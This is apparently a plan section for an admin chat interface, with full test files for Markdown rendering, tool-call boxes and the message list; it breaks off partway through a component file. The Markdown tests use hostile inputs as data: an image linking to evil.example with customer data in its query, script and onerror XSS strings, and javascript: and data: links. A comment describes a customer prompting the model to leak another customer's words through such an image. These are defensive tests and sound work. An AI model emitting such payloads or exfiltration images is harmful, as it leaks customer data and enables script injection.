Read first: the spec's rebuild section ("Messages", "Waiting", "Tool boxes"); the map's sections 1.5 to 1.7, 3.2, 3.3 (changes 1 to 5, 7 and 10), 3.4 and 4.7 to 4.9; R/`admin/src/components/MessageList.tsx:31-143` (the bubbles), `:145-258` (`MarkdownBody`), `:269-296` (`MarkdownLink`) and `:335-448` (the list); R/`admin/src/components/ToolCallDisplay.tsx:97-231`. Code: `admin/src/components/assistant/ChatMessages.tsx`, `ToolLine.tsx` and `AskTab.tsx` (what they draw today, and where the scrolling is), and `admin/src/assistant.ts` (`drawableParts`, `showsWorking`, `followsNewest`, `toolResultOf`, and from Task 2 `toolBoxOf`, `showsToolWait` and `safeLink`).

**Files:**
- Create: `admin/src/components/assistant/MarkdownBody.tsx`, `ToolBox.tsx`, `MessageList.tsx`
- Modify: `admin/src/components/assistant/AskTab.tsx`
- Delete: `admin/src/components/assistant/ChatMessages.tsx`, `ToolLine.tsx`
- Test: create `test/unit/markdown-body.test.tsx`, `test/unit/tool-box.test.tsx`, `test/unit/message-list.test.tsx`

**Interfaces:**
- Consumes: `toolBoxOf`, `ToolBoxModel`, `drawableParts`, `showsWorking`, `showsToolWait`, `followsNewest`, `toolResultOf`, `safeLink` and `PartLike` (`admin/src/assistant.ts`, Task 2 and before); `EmptyState` (Task 3); `renderInTheme` (Task 1). `toolLineOf` stays exported with its tests, and `toolBoxOf` shares its reading of a call, but no component calls it once `ToolLine.tsx` is gone.
- Produces:
  ```tsx
  // MarkdownBody.tsx: the assistant's text as Markdown with remark-gfm. The root has data-message-part="text".
  export const MarkdownBody: (props: { text: string }) => JSX.Element;
  // ToolBox.tsx: one tool call as a box. Closed at first. The frame has data-message-part="tool" and data-state="running" | "done" | "failed".
  export const ToolBox: (props: { box: ToolBoxModel }) => JSX.Element;
  // MessageList.tsx: the scrolling list. A region named "Chat messages", with the empty state while there is no message.
  export const MessageList: (props: {
    messages: readonly UIMessage[];          // from @tanstack/ai-client
    busy: boolean;                           // an answer is on its way
    onStarter: (text: string) => void;       // a starter in the empty state was pressed
    canStart: (text: string) => boolean;     // a starter that cannot send now is switched off
  }) => JSX.Element;
  ```
- Decisions made here: the scrolling moves from `AskTab` into `MessageList`, so the follow rule is tested with the list. The list follows again after staff send a message, and starts at the end when a different chat is shown (its first message changes), which the saved chats of Task 7 need. Thinking parts are not drawn (the map's 4.8 default): `drawableParts` stays as it is. A tool box is closed at first even while its tool runs, and each box keeps its own state. The dots are one row of their own after the last message, so they show once and also cover the wait before the first words come. A message with nothing to draw leaves no bubble.

**Review Focus covered here:**
- 1. Hostile text drawn on the screen: an image, a link that is not http or https, raw HTML, and customer-text tags in a tool result. Pinned by `MarkdownBody > does not draw an image: nothing is fetched, and nothing is left where it was`, `... shows raw HTML as text and never as HTML: no element, no handler, no script`, `... shows the text of a link to %s as plain text, with no link` (nine addresses), and `ToolBox > opens to the result as indented JSON with the customer-text tags taken out, and closes again`.
- 5. A table wider than the bubble, a long line of code and a long word. Pinned by `MarkdownBody > wide content > scrolls a wide table sideways inside its bubble...`, `... keeps a long line of code inside the bubble, with a scroll of its own`, and `the messages > wraps a long word in an assistant bubble instead of widening it, and keeps the bubble at most 80% of the list`.

- [ ] **Step 1: Write the failing tests**

`markdown-body.test.tsx` reads the rules styled-components wrote for an element (`cssOf`) to hold the theme colours and the scrolling of wide content, because jsdom does not lay anything out. The other two files do the same for colours. `message-list.test.tsx` gives jsdom the scroll sizes it does not work out (`measure`).

Create `test/unit/markdown-body.test.tsx`:

````tsx
// @vitest-environment jsdom
import { darkTheme, lightTheme } from '@strapi/design-system';
import { screen, within } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { MarkdownBody } from '../../admin/src/components/assistant/MarkdownBody';
import { renderInTheme } from './render';

/**
 * The CSS styled-components wrote for an element: every rule in the document that starts with one of the element's classes. The
 * document keeps the CSS of earlier tests, so a test reads only what its own element was drawn with.
 */
const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

const draw = (text: string, options?: { dark?: boolean }) => {
  const view = renderInTheme(<MarkdownBody text={text} />, options);
  return { ...view, body: view.container.querySelector('[data-message-part="text"]') as HTMLElement };
};

describe('MarkdownBody', () => {
  it('draws paragraphs, bold text, lists and headings', () => {
    const { body } = draw('## Waiting\n\nThree **visits** wait.\n\n- APT-4821\n- APT-4822\n\n1. First\n2. Second');
    expect(within(body).getByRole('heading', { level: 2, name: 'Waiting' })).toBeTruthy();
    expect(body.querySelector('strong')?.textContent).toBe('visits');
    expect(Array.from(body.querySelectorAll('ul li')).map((item) => item.textContent)).toEqual(['APT-4821', 'APT-4822']);
    expect(Array.from(body.querySelectorAll('ol li')).map((item) => item.textContent)).toEqual(['First', 'Second']);
  });

  it('draws a table, which is what the assistant is told to use for items with the same fields', () => {
    const { body } = draw(
      ['| Reference | Customer | Status |', '| --- | --- | --- |', '| APT-4821 | line:U4af…88 | requested |', '| APT-4822 | line:Ub12…09 | confirmed |'].join('\n')
    );
    const table = within(body).getByRole('table');
    expect(within(table).getAllByRole('columnheader').map((cell) => cell.textContent)).toEqual(['Reference', 'Customer', 'Status']);
    expect(within(table).getAllByRole('row')).toHaveLength(3);
    expect(within(table).getByRole('cell', { name: 'line:Ub12…09' })).toBeTruthy();
  });

  it('draws code, a quote, a struck-out word and a task list, which remark-gfm adds', () => {
    const { body } = draw('Use `list_requests`.\n\n```\nline 1\n```\n\n> quoted\n\n~~old~~\n\n- [x] done\n- [ ] open');
    expect(body.querySelector('p code')?.textContent).toBe('list_requests');
    expect(body.querySelector('pre code')?.textContent).toBe('line 1\n');
    expect(body.querySelector('blockquote')?.textContent?.trim()).toBe('quoted');
    expect(body.querySelector('del')?.textContent).toBe('old');
    expect(body.querySelectorAll('input[type="checkbox"]')).toHaveLength(2);
  });

  // The model reads customer text, so a customer could ask it for an image whose address carries another customer's words.
  it('does not draw an image: nothing is fetched, and nothing is left where it was', () => {
    const { body } = draw('Before ![the strap](https://evil.example/pixel.png?d=line:U4af…88) after');
    expect(body.querySelector('img')).toBeNull();
    expect(body.textContent).toContain('Before');
    expect(body.textContent).toContain('after');
    expect(body.innerHTML).not.toContain('evil.example');
  });

  it('shows raw HTML as text and never as HTML: no element, no handler, no script', () => {
    const { body } = draw('<img src=x onerror="alert(1)"> and <script>alert(2)</script> and <b>bold</b>');
    // The only element in the answer is its paragraph: what looks like HTML is text inside it.
    expect(Array.from(body.querySelectorAll('*')).map((element) => element.tagName)).toEqual(['P']);
    expect(body.textContent).toBe('<img src=x onerror="alert(1)"> and <script>alert(2)</script> and <b>bold</b>');
  });

  it('draws an http or https link that opens in a new tab and keeps the window to itself', () => {
    const { body } = draw('[Care guide](https://example.com/care) and [plain](http://example.com)');
    const [care, plain] = Array.from(body.querySelectorAll('a'));
    expect(care.getAttribute('href')).toBe('https://example.com/care');
    expect(care.getAttribute('target')).toBe('_blank');
    expect(care.getAttribute('rel')).toBe('noopener noreferrer');
    expect(care.textContent).toBe('Care guide');
    expect(plain.getAttribute('href')).toBe('http://example.com/');
    expect(plain.getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('draws a bare address as a link, which remark-gfm makes of it, with the same rules', () => {
    const { body } = draw('See https://example.com/care today.');
    const link = body.querySelector('a');
    expect(link?.getAttribute('href')).toBe('https://example.com/care');
    expect(link?.getAttribute('target')).toBe('_blank');
  });

  it.each([
    ['javascript:alert(1)'],
    ['JavaScript:alert(1)'],
    ['data:text/html;base64,PHNjcmlwdD4='],
    ['mailto:staff@example.com'],
    ['tel:+81312345678'],
    ['ftp://example.com/file'],
    ['/relative/path'],
    ['#anchor'],
    ['//example.com/protocol-relative'],
  ])('shows the text of a link to %s as plain text, with no link', (href) => {
    const { body } = draw(`Before [the label](${href}) after`);
    expect(body.querySelector('a')).toBeNull();
    expect(body.textContent).toBe('Before the label after');
  });

  it('keeps the node react-markdown hands to its components off the element', () => {
    const { body } = draw('[Care](https://example.com)');
    const link = body.querySelector('a') as HTMLAnchorElement;
    expect(link.hasAttribute('node')).toBe(false);
    expect(link.outerHTML).not.toContain('[object Object]');
    expect(Array.from(link.attributes).map((attribute) => attribute.name).sort()).toEqual(['href', 'rel', 'target']);
  });

  it('is the text of the answer only, so a check can read it apart from the rest of the message', () => {
    const { body } = draw('Hello');
    expect(body.getAttribute('data-message-part')).toBe('text');
  });

  it('draws an empty answer as nothing', () => {
    const { body } = draw('');
    expect(body.textContent).toBe('');
  });

  describe('wide content', () => {
    it('scrolls a wide table sideways inside its bubble: the table is a block with its own overflow, so it never widens the chat', () => {
      const { body } = draw('| a | b |\n| - | - |\n| 1 | 2 |');
      expect(cssOf(body)).toMatch(/ table\{[^}]*overflow-x:auto;display:block;\}/);
    });

    it('keeps a long line of code inside the bubble, with a scroll of its own', () => {
      const { body } = draw('```\n' + 'x'.repeat(300) + '\n```');
      expect(cssOf(body)).toMatch(/ pre\{[^}]*overflow-x:auto;/);
    });
  });

  describe('colours', () => {
    it('are the theme, never a black overlay: code, code blocks and table headers show in the dark theme too', () => {
      const { body } = draw('`code`\n\n| a |\n| - |\n| b |', { dark: true });
      const css = cssOf(body);
      expect(css).not.toMatch(/rgba\(/);
      expect(css).toContain(`code{font-size:0.85em;padding:1px 4px;border-radius:3px;background:${darkTheme.colors.neutral150};}`);
      expect(css).toContain(`th{background:${darkTheme.colors.neutral150};font-weight:600;}`);
      expect(css).toContain(`border-left:3px solid ${darkTheme.colors.neutral300}`);
      expect(css).not.toContain(lightTheme.colors.neutral150);
    });

    it('follow the light theme in the light theme', () => {
      const { body } = draw('`code`\n\n| a |\n| - |\n| b |');
      const css = cssOf(body);
      expect(css).toContain(`th{background:${lightTheme.colors.neutral150};font-weight:600;}`);
      expect(css).not.toContain(darkTheme.colors.neutral150);
    });

    it('give lists their markers and headings their weight, which the design system takes away', () => {
      const { body } = draw('# Title\n\n- one');
      const css = cssOf(body);
      expect(css).toMatch(/ ul\{list-style:disc;\}/);
      expect(css).toMatch(/ ol\{list-style:decimal;\}/);
      expect(css).toMatch(/h1,[^{]*h4\{[^}]*font-weight:600;/);
    });
  });
});
````

Create `test/unit/tool-box.test.tsx`:

```tsx
// @vitest-environment jsdom
import { darkTheme, lightTheme } from '@strapi/design-system';
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';
import { toolBoxOf, type PartLike, type ToolBoxModel } from '../../admin/src/assistant';
import { ToolBox } from '../../admin/src/components/assistant/ToolBox';
import { renderInTheme } from './render';

const call = (name: string, fields: Partial<PartLike> = {}): PartLike => ({ type: 'tool-call', id: 'call-1', name, arguments: '{}', state: 'complete', ...fields });
const boxOf = (part: PartLike, result?: PartLike): ToolBoxModel => toolBoxOf(part, result) as ToolBoxModel;

/** The rules styled-components wrote for an element: every rule in the document that starts with one of its classes. */
const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

const DONE = boxOf(
  call('list_inquiries', {
    output: { inquiries: [{ documentId: 'k1', customer: 'line:U4af…88', message: '<customer_message>The clasp broke.</customer_message>' }, { documentId: 'k2' }, { documentId: 'k3' }], capped: false },
  })
);
const RUNNING = boxOf(call('list_requests', { state: 'input-complete' }));
const FAILED = boxOf(call('list_requests', { output: { error: { code: 'not_found', message: 'No request APT-4812.', hint: 'Check the reference.' } } }));

const frameOf = (container: HTMLElement) => container.querySelector('[data-message-part="tool"]') as HTMLElement;

describe('ToolBox', () => {
  it('is closed at first, with a header that names the tool and says how many results it gave', () => {
    renderInTheme(<ToolBox box={DONE} />);
    const header = screen.getByRole('button', { name: /Tool: list_inquiries/ });
    expect(header.getAttribute('aria-expanded')).toBe('false');
    expect(header.textContent).toContain('Tool: list_inquiries');
    expect(header.textContent).toContain('3 results');
    expect(document.querySelector('pre')).toBeNull();
  });

  it('opens to the result as indented JSON with the customer-text tags taken out, and closes again', async () => {
    renderInTheme(<ToolBox box={DONE} />);
    const header = screen.getByRole('button', { name: /Tool: list_inquiries/ });

    await userEvent.click(header);
    expect(header.getAttribute('aria-expanded')).toBe('true');
    const body = document.querySelector('pre') as HTMLElement;
    expect(body.textContent).toContain('"message": "The clasp broke."');
    expect(body.textContent).toContain('"customer": "line:U4af…88"');
    expect(body.textContent).not.toContain('customer_message');
    expect(body.textContent?.startsWith('{\n  "inquiries": [')).toBe(true);

    await userEvent.click(header);
    expect(header.getAttribute('aria-expanded')).toBe('false');
    expect(document.querySelector('pre')).toBeNull();
  });

  it('turns the arrow with the box, and hides it from screen readers', async () => {
    renderInTheme(<ToolBox box={DONE} />);
    const arrow = () => document.querySelector('button span[aria-hidden="true"]') as HTMLElement;
    expect(arrow().textContent).toBe('▶');
    await userEvent.click(screen.getByRole('button', { name: /Tool: list_inquiries/ }));
    expect(arrow().textContent).toBe('▼');
  });

  it('shows a spinner while the call runs, with no count, and the wait when it is opened', async () => {
    renderInTheme(<ToolBox box={RUNNING} />);
    expect(screen.getByLabelText('running')).toBeTruthy();
    const header = screen.getByRole('button', { name: /Tool: list_requests/ });
    expect(header.textContent).not.toMatch(/result|done|failed/);
    await userEvent.click(header);
    expect(document.querySelector('pre')?.textContent).toBe('Waiting for result...');
  });

  it('says "done" for a call that gave nothing to count', () => {
    renderInTheme(<ToolBox box={boxOf(call('inquiry_counts', { output: { needsAnswer: 4 } }))} />);
    expect(screen.getByRole('button', { name: /Tool: inquiry_counts/ }).textContent).toContain('done');
  });

  describe('a failed call', () => {
    it('says "failed" in the header and shows the tool\'s own message when it is opened', async () => {
      renderInTheme(<ToolBox box={FAILED} />);
      const header = screen.getByRole('button', { name: /Tool: list_requests/ });
      expect(header.textContent).toContain('failed');
      await userEvent.click(header);
      expect(document.querySelector('pre')?.textContent).toBe('No request APT-4812.');
    });

    it('is marked: a danger border and the word "failed" in the danger colour, where a finished box has neither', () => {
      const failed = renderInTheme(<ToolBox box={FAILED} />);
      const failedFrame = frameOf(failed.container);
      expect(failedFrame.getAttribute('data-state')).toBe('failed');
      expect(cssOf(failedFrame)).toContain(`border:1px solid ${lightTheme.colors.danger200}`);
      expect(cssOf(screen.getByText('failed'))).toContain(`color:${lightTheme.colors.danger600}`);
      failed.unmount();

      const done = renderInTheme(<ToolBox box={DONE} />);
      const doneFrame = frameOf(done.container);
      expect(doneFrame.getAttribute('data-state')).toBe('done');
      expect(cssOf(doneFrame)).toContain(`border:1px solid ${lightTheme.colors.neutral200}`);
      expect(cssOf(doneFrame)).not.toContain(lightTheme.colors.danger200);
      expect(cssOf(screen.getByText('3 results'))).not.toContain(lightTheme.colors.danger600);
    });

    it('is marked in the dark theme with the dark theme\'s colours', () => {
      const { container } = renderInTheme(<ToolBox box={FAILED} />, { dark: true });
      expect(cssOf(frameOf(container))).toContain(`border:1px solid ${darkTheme.colors.danger200}`);
      expect(cssOf(screen.getByText('failed'))).toContain(`color:${darkTheme.colors.danger600}`);
    });
  });

  it('is marked by its state, for a check to read: running, done or failed', () => {
    for (const [box, state] of [[RUNNING, 'running'], [DONE, 'done'], [FAILED, 'failed']] as const) {
      const { container, unmount } = renderInTheme(<ToolBox box={box} />);
      expect(frameOf(container).getAttribute('data-state')).toBe(state);
      unmount();
    }
  });
});
```

Create `test/unit/message-list.test.tsx`:

```tsx
// @vitest-environment jsdom
import { lightTheme } from '@strapi/design-system';
import { fireEvent, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { MessageList } from '../../admin/src/components/assistant/MessageList';
import { renderInTheme } from './render';

type Part = Record<string, any>;
const text = (content: string): Part => ({ type: 'text', content });
const staff = (id: string, content = 'Which visits are waiting?') => ({ id, role: 'user', parts: [text(content)] }) as never;
const assistant = (id: string, parts: Part[]) => ({ id, role: 'assistant', parts }) as never;
const runningCall = (id: string): Part => ({ type: 'tool-call', id, name: 'list_requests', arguments: '{}', state: 'input-complete' });
const finishedCall = (id: string, output: unknown = { requests: [{ reference: 'APT-4821' }], capped: false }): Part => ({ type: 'tool-call', id, name: 'list_requests', arguments: '{}', state: 'complete', output });
const failedCall = (id: string): Part => finishedCall(id, { error: { code: 'not_found', message: 'No request APT-4812.', hint: 'Check the reference.' } });

const list = (messages: unknown[], props: Partial<Parameters<typeof MessageList>[0]> = {}) => (
  <MessageList messages={messages as never} busy={false} onStarter={() => {}} canStart={() => true} {...props} />
);
const rows = (container: HTMLElement, role?: string) => Array.from(container.querySelectorAll(`[data-message-role${role ? `="${role}"` : ''}]`)) as HTMLElement[];

/** The rules styled-components wrote for an element: every rule in the document that starts with one of its classes. */
const cssOf = (element: Element): string => {
  const all = Array.from(document.querySelectorAll('style'))
    .map((style) => style.textContent ?? '')
    .join('\n');
  const classes = Array.from(element.classList);
  return all
    .split('}')
    .filter((rule) => classes.some((name) => rule.trimStart().startsWith(`.${name}`)))
    .map((rule) => `${rule}}`)
    .join('\n');
};

describe('the empty chat', () => {
  it('shows the empty state with the starters, and no message', () => {
    const { container } = renderInTheme(list([]));
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(screen.getAllByRole('button')).toHaveLength(3);
    expect(rows(container)).toHaveLength(0);
  });

  it("sends a starter's text when it is pressed, and switches off the starters that cannot send", async () => {
    const onStarter = vi.fn();
    renderInTheme(list([], { onStarter, canStart: (starter) => starter !== 'Any complaints this week?' }));
    await userEvent.click(screen.getByRole('button', { name: 'Which visits are waiting for staff?' }));
    expect(onStarter).toHaveBeenCalledExactlyOnceWith('Which visits are waiting for staff?');
    expect((screen.getByRole('button', { name: 'Any complaints this week?' }) as HTMLButtonElement).disabled).toBe(true);
  });

  it('shows no empty state once there is a message', () => {
    renderInTheme(list([staff('u1')]));
    expect(screen.queryByText('Ask Maison')).toBeNull();
  });
});

describe('the messages', () => {
  it('draws a staff message on the right, with the label "You", and no avatar', () => {
    const { container } = renderInTheme(list([staff('u1', 'Which visits are waiting?')]));
    const [row] = rows(container, 'user');
    expect(within(row).getByText('You')).toBeTruthy();
    expect(within(row).getByText('Which visits are waiting?')).toBeTruthy();
    expect(row.querySelector('svg')).toBeNull();
    expect(cssOf(row)).toContain('align-self:flex-end');
  });

  it('keeps the line breaks of a staff message, and wraps a long word instead of widening the bubble', () => {
    const { container } = renderInTheme(list([staff('u1', 'First line\nSecond line')]));
    const body = within(rows(container, 'user')[0]).getByText(/First line/);
    expect(body.textContent).toBe('First line\nSecond line');
    expect(cssOf(body)).toContain('white-space:pre-wrap');
    expect(cssOf(body)).toContain('overflow-wrap:anywhere');
  });

  it('draws a staff message as text, never as Markdown: what staff type is what they sent', () => {
    const { container } = renderInTheme(list([staff('u1', '**not bold** and a | b')]));
    const [row] = rows(container, 'user');
    expect(row.querySelector('strong')).toBeNull();
    expect(within(row).getByText('**not bold** and a | b')).toBeTruthy();
  });

  it('draws an assistant message on the left, with the Sparkle avatar outside its bubble and the label "Assistant"', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text('Three visits wait.')])]));
    const [row] = rows(container, 'assistant');
    expect(within(row).getByText('Assistant')).toBeTruthy();
    const avatar = row.querySelector('svg') as SVGElement;
    expect(avatar).not.toBeNull();
    expect(avatar.parentElement?.getAttribute('aria-hidden')).toBe('true');
    expect(within(row).getByText('Three visits wait.')).toBeTruthy();
    expect(cssOf(row)).toContain('align-self:flex-start');
  });

  it("draws an assistant answer as Markdown: a table, which an answer of items with the same fields uses", () => {
    const table = ['| Reference | Status |', '| --- | --- |', '| APT-4821 | requested |'].join('\n');
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text(table)])]));
    const [row] = rows(container, 'assistant');
    expect(within(row).getByRole('table')).toBeTruthy();
    expect(within(row).getByRole('cell', { name: 'APT-4821' })).toBeTruthy();
    expect(row.querySelector('[data-message-part="text"]')).not.toBeNull();
  });

  it('draws each part in the order it arrived: text, then a tool box, then more text', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text('Let me look.'), finishedCall('c1'), text('One visit waits.')])]));
    const [row] = rows(container, 'assistant');
    const order = Array.from(row.querySelectorAll('[data-message-part]')).map((part) => `${part.getAttribute('data-message-part')}:${part.textContent?.slice(0, 20)}`);
    expect(order).toHaveLength(3);
    expect(order[0]).toBe('text:Let me look.');
    expect(order[1]).toMatch(/^tool:.*list_requests/);
    expect(order[2]).toBe('text:One visit waits.');
  });

  it('draws one box for each tool call, in the order of the calls, closed at first', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [finishedCall('c1'), runningCall('c2'), failedCall('c3')])]));
    const boxes = Array.from(container.querySelectorAll('[data-message-part="tool"]'));
    expect(boxes.map((box) => box.getAttribute('data-state'))).toEqual(['done', 'running', 'failed']);
    for (const box of boxes) expect(within(box as HTMLElement).getByRole('button').getAttribute('aria-expanded')).toBe('false');
  });

  it('marks a failed box, and opens a finished one to its result', async () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [finishedCall('c1'), failedCall('c2')])]));
    const [done, failed] = Array.from(container.querySelectorAll('[data-message-part="tool"]')) as HTMLElement[];
    expect(within(failed).getByText('failed')).toBeTruthy();
    expect(cssOf(failed)).toContain(lightTheme.colors.danger200);
    await userEvent.click(within(done).getByRole('button'));
    expect(done.querySelector('pre')?.textContent).toContain('"reference": "APT-4821"');
  });

  it('draws no message with nothing to draw: thinking alone, or no part at all, leaves no empty bubble', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [{ type: 'thinking', content: 'Let me think.' }]), assistant('a2', []), assistant('a3', [text('   ')])]));
    expect(rows(container, 'assistant')).toHaveLength(0);
    expect(rows(container, 'user')).toHaveLength(1);
  });

  it('draws no part for a tool that has no box: a draft tool, which has a card of its own', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text('Here.'), { type: 'tool-call', id: 'c1', name: 'draft_reply', arguments: '{}', state: 'complete' }])]));
    expect(container.querySelectorAll('[data-message-part="tool"]')).toHaveLength(0);
  });

  it('colours a staff bubble in the primary colour and an assistant bubble in grey, from the theme', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text('Hi.')])]));
    const staffBubble = within(rows(container, 'user')[0]).getByText('You').parentElement as HTMLElement;
    const assistantBubble = within(rows(container, 'assistant')[0]).getByText('Assistant').parentElement as HTMLElement;
    expect(cssOf(staffBubble)).toContain(`background-color:${lightTheme.colors.primary600}`);
    expect(cssOf(assistantBubble)).toContain(`background-color:${lightTheme.colors.neutral100}`);
  });

  it('wraps a long word in an assistant bubble instead of widening it, and keeps the bubble at most 80% of the list', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text('x'.repeat(400))])]));
    const row = rows(container, 'assistant')[0];
    const bubble = within(row).getByText('Assistant').parentElement as HTMLElement;
    expect(cssOf(bubble)).toContain('word-break:break-word');
    expect(cssOf(bubble)).toContain('min-width:0');
    expect(cssOf(row)).toContain('max-width:80%');
  });

  it('is a region named "Chat messages" that the keyboard can scroll', () => {
    renderInTheme(list([staff('u1')]));
    const region = screen.getByRole('region', { name: 'Chat messages' });
    expect(region.getAttribute('tabindex')).toBe('0');
  });
});

describe('waiting', () => {
  it('shows the dots in an assistant bubble with the avatar while the answer is on its way and nothing has come yet', () => {
    const { container } = renderInTheme(list([staff('u1')], { busy: true }));
    const dots = screen.getByRole('status', { name: 'Assistant is replying' });
    const row = dots.closest('[data-message-role]') as HTMLElement;
    expect(row.getAttribute('data-message-role')).toBe('assistant');
    expect(within(row).getByText('Assistant')).toBeTruthy();
    expect(row.querySelector('svg')).not.toBeNull();
    expect(dots.querySelectorAll('span')).toHaveLength(3);
    expect(rows(container)).toHaveLength(2);
  });

  it('shows the dots while the assistant message holds only thinking, and not any other time', () => {
    renderInTheme(list([staff('u1'), assistant('a1', [{ type: 'thinking', content: '...' }])], { busy: true }));
    expect(screen.getByRole('status', { name: 'Assistant is replying' })).toBeTruthy();
  });

  it('shows no dots once words or a tool box are on the screen: that is the sign of work', () => {
    const { unmount } = renderInTheme(list([staff('u1'), assistant('a1', [text('Looking.')])], { busy: true }));
    expect(screen.queryByRole('status', { name: 'Assistant is replying' })).toBeNull();
    unmount();
    renderInTheme(list([staff('u1'), assistant('a1', [runningCall('c1')])], { busy: true }));
    expect(screen.queryByRole('status', { name: 'Assistant is replying' })).toBeNull();
  });

  it('shows no dots when nothing is answering', () => {
    renderInTheme(list([staff('u1')], { busy: false }));
    expect(screen.queryByRole('status', { name: 'Assistant is replying' })).toBeNull();
  });

  it('shows "Working on it…" under the tool boxes while a tool runs below text that has already come', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text('Let me look.'), runningCall('c1')])], { busy: true }));
    const wait = within(screen.getByRole('region', { name: 'Chat messages' })).getByRole('status');
    expect(wait.textContent).toBe('Working on it…');
    const bubble = rows(container, 'assistant')[0];
    expect(bubble.contains(wait)).toBe(true);
    const box = bubble.querySelector('[data-message-part="tool"]') as HTMLElement;
    expect(Boolean(box.compareDocumentPosition(wait) & Node.DOCUMENT_POSITION_FOLLOWING)).toBe(true);
    expect(screen.queryByRole('status', { name: 'Assistant is replying' })).toBeNull();
  });

  it('shows no "Working on it…" with no text yet, when every tool is over, or when nothing is answering', () => {
    const { unmount: first } = renderInTheme(list([staff('u1'), assistant('a1', [runningCall('c1')])], { busy: true }));
    expect(screen.queryByText('Working on it…')).toBeNull();
    first();
    const { unmount: second } = renderInTheme(list([staff('u1'), assistant('a1', [text('Let me look.'), finishedCall('c1')])], { busy: true }));
    expect(screen.queryByText('Working on it…')).toBeNull();
    second();
    renderInTheme(list([staff('u1'), assistant('a1', [text('Let me look.'), runningCall('c1')])], { busy: false }));
    expect(screen.queryByText('Working on it…')).toBeNull();
  });
});

describe('scrolling', () => {
  /** Gives the scroller a height and a scroll position, which jsdom does not work out. */
  const measure = (region: HTMLElement, { scrollHeight, clientHeight = 400, scrollTop = 0 }: { scrollHeight: number; clientHeight?: number; scrollTop?: number }) => {
    let top = scrollTop;
    Object.defineProperty(region, 'scrollHeight', { configurable: true, get: () => scrollHeight });
    Object.defineProperty(region, 'clientHeight', { configurable: true, get: () => clientHeight });
    Object.defineProperty(region, 'scrollTop', { configurable: true, get: () => top, set: (value: number) => (top = value) });
  };

  it('follows the newest message while the reader is at the bottom', () => {
    const view = renderInTheme(list([staff('u1')]));
    const region = screen.getByRole('region', { name: 'Chat messages' });
    measure(region, { scrollHeight: 1000, scrollTop: 600 });
    view.rerender(list([staff('u1'), assistant('a1', [text('Hello.')])]));
    expect(region.scrollTop).toBe(1000);
  });

  it('lets a reader who has scrolled up read on: the answer does not pull them down', () => {
    const view = renderInTheme(list([staff('u1'), assistant('a1', [text('Hello.')])]));
    const region = screen.getByRole('region', { name: 'Chat messages' });
    measure(region, { scrollHeight: 1000, scrollTop: 100 });
    fireEvent.scroll(region);
    view.rerender(list([staff('u1'), assistant('a1', [text('Hello. And more words.')])]));
    expect(region.scrollTop).toBe(100);
  });

  it('follows again after staff send a message', () => {
    const view = renderInTheme(list([staff('u1'), assistant('a1', [text('Hello.')])]));
    const region = screen.getByRole('region', { name: 'Chat messages' });
    measure(region, { scrollHeight: 1000, scrollTop: 100 });
    fireEvent.scroll(region);
    view.rerender(list([staff('u1'), assistant('a1', [text('Hello.')]), staff('u2', 'And the questions?')]));
    expect(region.scrollTop).toBe(1000);
  });

  it('starts at the end of a different chat: another one is opened, even when the reader had scrolled up in the last', () => {
    const view = renderInTheme(list([staff('u1'), assistant('a1', [text('Hello.')])]));
    const region = screen.getByRole('region', { name: 'Chat messages' });
    measure(region, { scrollHeight: 1000, scrollTop: 100 });
    fireEvent.scroll(region);
    view.rerender(list([staff('other-1'), assistant('other-2', [text('An older chat.')])]));
    expect(region.scrollTop).toBe(1000);
  });
});

describe('the dark theme', () => {
  it('draws the messages with the dark theme\'s colours', () => {
    const { container } = renderInTheme(list([staff('u1'), assistant('a1', [text('Hi.')])]), { dark: true });
    expect(rows(container)).toHaveLength(2);
    const staffBubble = within(rows(container, 'user')[0]).getByText('You').parentElement as HTMLElement;
    expect(cssOf(staffBubble)).not.toContain(lightTheme.colors.primary600);
  });
});
```

- [ ] **Step 2: Run them to see them fail**

Run: `npm test -- test/unit/markdown-body.test.tsx test/unit/tool-box.test.tsx test/unit/message-list.test.tsx`
Expected: FAIL, `Test Files  3 failed (3)` and `Tests  no tests`. The three components do not exist yet.

- [ ] **Step 3: Write the Markdown body and the tool box**

`MarkdownBody.tsx` is the reference's `MarkdownBody` and `MarkdownLink`, with the changes the spec names: the four literal black tints are theme colours, lists get their markers and headings their weight back (the design system's global style takes both away), images are not drawn (`disallowedElements`), and a link is a link only for `http:` and `https:` (`safeLink`), opens in a new tab and has `rel="noopener noreferrer"`. The link leaves out the `node` prop react-markdown hands it. `ToolBox.tsx` is the reference's `ToolCallDisplay` without its chips and links, fed by `toolBoxOf`, with a marked failed state.

Create `admin/src/components/assistant/MarkdownBody.tsx`:

```tsx
import type { ComponentProps } from 'react';

import Markdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import styled from 'styled-components';

import { safeLink } from '../../assistant';

/**
 * The assistant's answer, drawn from Markdown: paragraphs, lists, tables, code, quotes and links. Copied from strapi-plugin-tanstack-ai
 * 1.6.0 (`MarkdownBody` in `MessageList.tsx`), with these changes.
